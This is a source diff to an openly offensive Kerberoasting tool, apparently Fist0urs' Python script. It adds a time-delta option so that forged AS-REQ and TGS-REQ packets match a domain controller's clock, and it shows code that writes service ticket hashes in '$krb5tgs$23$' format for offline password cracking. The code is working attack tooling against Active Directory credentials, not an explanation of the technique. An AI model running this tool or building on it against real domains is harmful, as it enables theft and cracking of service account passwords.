@@ -1,8 +1,8 @@
 # ----------------------------------------------------------------------------
 # "THE BEER-WARE LICENSE" (Revision 42):
-# <eddy (dot) maaalou (at) gmail (dot) com> wrote this file.  As long as you 
-# retain this notice you can do whatever you want with this stuff. If we meet 
-# some day, and you think this stuff is worth it, you can buy me a beer in 
+# <eddy (dot) maaalou (at) gmail (dot) com> wrote this file.  As long as you
+# retain this notice you can do whatever you want with this stuff. If we meet
+# some day, and you think this stuff is worth it, you can buy me a beer in
 # return.   Fist0urs
 # ----------------------------------------------------------------------------
 
@@ -85,7 +85,7 @@ class AttackParameters():
                 auth_gssapi = False, list_spn = None,
                 tgt = None, session_key = None,
                 logon_time = None, outputfile_path = None,
-                as_data = {}
+                time_delta = 0, as_data = {}
                 ):
 
         self.user_account = user_account
@@ -100,6 +100,7 @@ class AttackParameters():
         self.tgt = tgt
         self.session_key = session_key
         self.logon_time = logon_time
+        self.time_delta = time_delta
         self.as_data = as_data
 
     # We ask a TGT with PAC when LDAP connection is made through gssapi
@@ -111,7 +112,7 @@ class AttackParameters():
         WRITE_STDERR('  [+] Building AS-REQ for %s...' % DC_addr)
 
         nonce = getrandbits(31)
-        current_time = time()
+        current_time = time() + self.time_delta
 
         as_req = build_as_req(self.realm, self.user_account,
                               self.key, current_time,
@@ -169,7 +170,7 @@ class AttackParameters():
     def TGS_attack(self):
         WRITE_STDERR('\n' + P + '[+] Iterating through SPN and building '\
                     + "corresponding TGS-REQ\n" + W)
-        
+
         if self.outputfile_path != None:
             try:
                 outputfile = open(self.outputfile_path,'w')
@@ -189,7 +190,7 @@ class AttackParameters():
             # generate Kerberos pre-requesite
             subkey = generate_subkey()
             nonce = getrandbits(31)
-            current_time = time()
+            current_time = time() + self.time_delta
 
             # send custom TGS-REQ packet
             sock = self.forge_custom_TGS_REQ(target_service, target_host,
@@ -211,12 +212,12 @@ class AttackParameters():
                 # zfill make sure a leading '0' is added when needed
                 c =c + hex(i).replace("0x",'').zfill(2)
                 existing_SPN = 1
-            
+
             sys.stderr.write("$krb5tgs$23$*" + samaccountname + "$"\
                 + self.DC_addr + "$" + target_service + "/" + target_host.split(':')[0] + "*$"\
                 + c[:32] + "$" + c[32:] + '\n')
             sys.stderr.flush()
-            
+
             if self.outputfile_path != None:
                 outputfile.write("$krb5tgs$23$*" + samaccountname + "$"\
                 + self.DC_addr + "$" + target_service + "/" + target_host.split(':')[0] + "*$"\
@@ -448,6 +449,10 @@ def parse_arguments():
     parser.add_argument('-v', '--verbose', required=False, action='store_const', const=1,
     help="increase verbosity level")
 
+    parser.add_argument('--delta', required=False,
+    help="set time delta in Kerberos tickets. Useful when DC is not on the same timezone.\
+    Format is \"(+/-)hours:minutes:seconds\", eg. --delta=\"+00:05:00\" or --delta=\"-02:00:00\"")
+
     group2.add_argument('-k', '--user_sid', required=False, help="force ldap SPN\
     retrieval through kerberos, sid is mandatory. Cannot be used with '-i'")
 
@@ -508,14 +513,27 @@ if __name__ == '__main__':
         except:
             WRITE_STDERR(R + "Cannot open " + B + '\'' + \
                             options.inputfile_spn + '\', exiting\n' + W)
-            exit()
+            sys.exit(1)
 
     if options.input_TGT_File :
         DataSubmitted.Parse_TGT_File(options.input_TGT_File)
 
     if options.verbose:
         verbose_level = 1
-        
+
+    if options.delta:
+        sign = options.delta[0]
+        time_array = options.delta[1:].split(':')
+
+        if sign == '+':
+            DataSubmitted.time_delta = int(time_array[0]) * 3600 + int(time_array[1]) * 60 + int(time_array[2])
+        elif sign == '-':
+            DataSubmitted.time_delta = - (int(time_array[0]) * 3600 + int(time_array[1]) * 60 + int(time_array[2]))
+        else:
+            sys.stderr.write(O + "Sign must be '+' or '-'. Exiting. \n" + W)
+            sys.stderr.flush()
+            sys.exit(1)
+
     # launching attack!
 
     # file containing SPN is provided
